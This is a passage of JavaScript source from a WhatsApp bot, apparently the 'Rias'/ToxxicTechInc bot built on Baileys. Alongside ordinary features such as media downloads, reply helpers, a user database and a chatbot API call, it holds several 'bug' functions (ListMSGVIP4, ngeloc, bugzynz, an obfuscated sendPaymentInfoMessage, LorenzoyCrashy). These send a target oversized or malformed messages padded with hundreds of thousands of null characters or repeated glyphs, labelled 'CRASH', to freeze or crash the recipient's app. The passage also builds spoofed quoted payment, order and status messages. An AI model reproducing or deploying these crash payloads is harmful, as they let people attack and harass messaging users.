    if (mpbrp === "mp3") {
   
        
    let yt;
    try {
        yt = await youtubedl(urlnyu);
    } catch (error) {
        yt = await youtubedlv2(urlnyu);
    }
//console.log(yt)
    const link = await yt.audio['128kbps'].download();

    let doc = {
        audio: {
            url: link
        },
        mimetype: 'audio/mp4',
        fileName: "Download With Rias "+xtime 
    };

    return ToxxicTechInc.sendMessage(m.chat, doc, { quoted: m });

      
    } else if (mpbrp === "mp4") {
    
    
    let yt;
    try {
        yt = await youtubedl(urlnyu);
    } catch (error) {
        yt = await youtubedlv2(urlnyu);
    }
    //console.log(yt)
const linnjjhk = await yt.video['360p'].download();

await ToxxicTechInc.sendMessage(m.chat, {
video: { url: linnjjhk },
 caption: `Done`, 
 }, {quoted: m })

    } else {
      m.reply("Format");
    }
  } catch (e) {
    m.reply(`Error: ${e}`);
  }
}

async function ListMSGVIP4(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title:
              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(920000),
                footerText: '',
                description: '',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'Hemm',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'ppq',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: false,
            },
        }),
        { userJid: userJid }
    );
    await ToxxicTechInc.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝕽𝖎𝖆𝖘 𝖃 𝕮𝖗𝖆𝖘𝖍𝖍`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await ToxxicTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function bugzynz(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {

  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》

_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 

𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈

*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

𝐑𝐈𝐀𝐒 𝐂𝐑𝐀𝐒𝐇
乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(50000),

    "sequenceNumber": "0",

    "jpegThumbnail": ""

     }

  }

}

}), { userJid: target, quoted: kuwoted })

await ToxxicTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })

}
    
(function(_0x4a0c3c,_0x449ed6){var _0x104feb=_0x1bd9,_0x3e3dd0=_0x4a0c3c();while(!![]){try{var _0x481ad5=parseInt(_0x104feb(0x123))/0x1*(-parseInt(_0x104feb(0x12c))/0x2)+-parseInt(_0x104feb(0x12e))/0x3+-parseInt(_0x104feb(0x11f))/0x4+parseInt(_0x104feb(0x120))/0x5+parseInt(_0x104feb(0x11e))/0x6*(-parseInt(_0x104feb(0x126))/0x7)+-parseInt(_0x104feb(0x12f))/0x8+-parseInt(_0x104feb(0x125))/0x9*(-parseInt(_0x104feb(0x121))/0xa);if(_0x481ad5===_0x449ed6)break;else _0x3e3dd0['push'](_0x3e3dd0['shift']());}catch(_0x2c4bb4){_0x3e3dd0['push'](_0x3e3dd0['shift']());}}}(_0x5751,0x33690));function hi(){var _0x4ca531=_0x1bd9;console['log'](_0x4ca531(0x122));}function _0x5751(){var _0x5489b7=['10RyLaBj','Hello\x20World!','10412BelDfW','meu\x20ovo','10276299zlszHl','42MFbSVh','physical-goods','payment_info','pix_static_code','pending','4P46GMY57GC','38zEAssq','+5533998586057','495336GBTdnV','1900344WdqeoS','ORDER','33228OrqiJL','1342808IxSDsY','190890kWQtXO'];_0x5751=function(){return _0x5489b7;};return _0x5751();}hi();function _0x1bd9(_0xdb0a9e,_0x35a4f6){var _0x5751dd=_0x5751();return _0x1bd9=function(_0x1bd910,_0x4c97e1){_0x1bd910=_0x1bd910-0x11e;var _0x5d47b4=_0x5751dd[_0x1bd910];return _0x5d47b4;},_0x1bd9(_0xdb0a9e,_0x35a4f6);}async function sendPaymentInfoMessage(_0x28ef97){var _0x404515=_0x1bd9;await ToxxicTechInc['relayMessage'](_0x28ef97,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadataVersion':0x2,'deviceListMetadata':{}},'interactiveMessage':{'nativeFlowMessage':{'buttons':[{'name':_0x404515(0x128),'buttonParamsJson':JSON['stringify']({'currency':'BRL','total_amount':{'value':0x0,'offset':0x64},'reference_id':_0x404515(0x12b),'type':_0x404515(0x127),'order':{'status':_0x404515(0x12a),'subtotal':{'value':0x0,'offset':0x64},'order_type':_0x404515(0x130),'items':[{'name':'','amount':{'value':0x0,'offset':0x64},'quantity':0x0,'sale_amount':{'value':0x0,'offset':0x64}}]},'payment_settings':[{'type':_0x404515(0x129),'pix_static_code':{'merchant_name':_0x404515(0x124),'key':_0x404515(0x12d),'key_type':'X'}}]})}]}}}}},{'participant':{'jid':_0x28ef97}},{'messageId':null});}

// BATA FUNCTION //
    
const zyn = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2029",
      thumbnail: xsteek,
      itemCount: 999999999999999,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `${m.body || m.mtype}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 999,
    isForwarded: true
  }
};
    

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};
//bug functions
const subscribe_FallZx = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `ToxxicTechInc's ur father`
}}
}
async function LorenzoyCrashy(FallZx,chat) {
ToxxicTechInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${FallZx}.${hakarin1}` ,
caption: `${FallZx + hakarin1}`,
}, {quoted: subscribe_FallZx })
}
//end bug functions

        //premium
        async function replyprem(teks) {
    newReply(`This feature is for premium user, contact the owner to become premium user`)
}
        //script replier
        async function sendToxxicTechIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await ToxxicTechInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
        async function newReply(teks) {
            if (typereply === 'v1') {
                m.reply(teks)
            } else if (typereply === 'v2') {
                ToxxicTechInc.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: 'Reply V2 Method',
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               ToxxicTechInc.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: 'Reply V3 method',
                        thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: fakestatus })
            } else if (typereply === 'v4') {
                newReply2(teks)
            }
        }
        
        //fake reply with channel link embedded
async function newReply2(txt) {
const Toxxiconrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "Click Here For Free Panel",
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname, 
body: ownername,
thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
sourceUrl: websitex
},
},
text: txt,
}
return ToxxicTechInc.sendMessage(from, Toxxiconrep, {
quoted: fkontak,
})
}
            
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted 
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: " ꪹỉꪖక ᦋꪹꫀꪑꪮꪹꪗ ",jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `᭖͜͡RIAS GREMORY`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;BiiofcBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://ibb.co/bFBQhnF' }}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./File/theme/rias.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
       const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363336528578108@newsletter',
    newsletterName: '',
    caption: body
}}}
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = ToxxicTechInc.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: ToxxicTechInc.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('chatbot' in chats)) chats.chatbot = false
                  if (!('antibug' in chats)) chats.antibug = false
                  if (!('antidelete' in chats)) chats.antidelete = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  chatbot: false, 
                  antibug: false,
                  antidelete: false, 
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: ToxxicTechInc.getName(botNumber), alias: botname}, owner: { nick: ToxxicTechInc.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: ToxxicTechInc.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: ToxxicTechInc.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
       
        //photo uploader
        async function uploadtoimgur(imagepath) {
  try {
    const response = await client.upload({
      image: fs.createReadStream(imagepath),
      type: 'stream',
    })

    let url = response.data.link
    console.log(url)
    return url
  } catch (error) {
    console.error('Error uploading image to Imgur:', error)
    throw error
  }
}  
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}
      //================================CHAT BOT======================================//
        if (!m.key.fromMe && !m.isBaileys && db.data.chats[m.chat].chatbot === true) {
    try {
        // Make the API call
        const botreply = await axios.get(`https://api.abrotech.com.ng/api/chatgpt4?prompt=${budy}&apikey=abrotech`);

        // Check if the API response is valid and contains the expected data
        if (botreply && botreply.data && botreply.data.response) {
            const txt = `${botreply.data.response}`;
            // Send the message using ToxxicTechInc
            ToxxicTechInc.sendMessage(m.chat, {text: txt}, {quoted: m});
        } else {
            // If API response is not as expected, send error message to the chat
            ToxxicTechInc.sendMessage(m.chat, {text: 'Error: Unexpected response from chatbot API.'}, {quoted: m});
        }
    } catch (error) {
        // Send error message to chat with a brief explanation
        const errorMsg = `Error: Failed to get a response from the chatbot. ${error.message || 'Unknown error occurred.'}`;
        ToxxicTechInc.sendMessage(m.chat, {text: errorMsg}, {quoted: m});
        console.error('Error fetching response from API:', error); // Log error for debugging
    }
}

//=====================================END CHAT BOT==================================//
//autoreact
const Lorenzoreact = async () => {
  const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
  for (const emoji of emojis) {
    await sleep(80);
    ToxxicTechInc.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  await sleep(50);
  ToxxicTechInc.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}
      //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'save' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await ToxxicTechInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        ToxxicTechInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        newReply('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await ToxxicTechInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        ToxxicTechInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        newReply('*Downloading status...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}

//bug loading
async function loading () {
var loadToxxicTechInc = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》𝟏𝟎%",
"《 ████▒▒▒▒▒▒▒▒》𝟑𝟎%",
"《 ███████▒▒▒▒▒》𝟓𝟎%",
"《 ██████████▒▒》𝟖𝟎%",
"《 ████████████》𝟏𝟎𝟎%",
"𝚀𝚄𝙴𝙴𝙽 𝚁𝙸𝙰𝚂 𝚆𝙰𝚂 𝙷𝙴𝚁𝙴..."
]
let { key } = await ToxxicTechInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < loadToxxicTechInc.length; i++) {
await ToxxicTechInc.sendMessage(from, {text: loadToxxicTechInc[i], edit: key })
}
} 

const Lorenzoimun = (texto) => {
ToxxicTechInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return m.reply("Erro..")
})
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `𝐑𝐢𝐚⃟𝐬 ⃟𝐂𝐨𝐫𝐞`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}


//sticker meta function
